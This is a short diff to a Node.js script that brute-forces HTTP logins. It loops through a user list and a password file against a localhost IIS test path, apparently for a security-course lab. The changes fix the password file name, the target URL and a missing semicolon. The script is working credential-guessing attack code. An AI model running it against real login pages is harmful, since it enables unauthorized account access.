@@ -10,10 +10,10 @@ const usersReader = readline.createInterface({
 let passwordReader;
 usersReader.on("line", user => {
     passwordReader = readline.createInterface({
-        input: fs.createReadStream("users.txt")
+        input: fs.createReadStream("passwords.txt")
     });
     passwordReader.on("line", password => {
-        sendREquest("http://127.0.0.1/securityModel3IL/Scripts/bruteForceIIS/test/", user, password)
+        sendREquest("http://127.0.0.1/securityModel3IL/scripts/bruteForceIIS/server-test/", user, password)
             .then(() => console.log(`${user} => ${password}`))
             .catch(() => {});
     });
@@ -33,6 +33,6 @@ function sendREquest(url, username, password) {
             } else {
                 reject();
             }
-        })
+        });
     });
 }
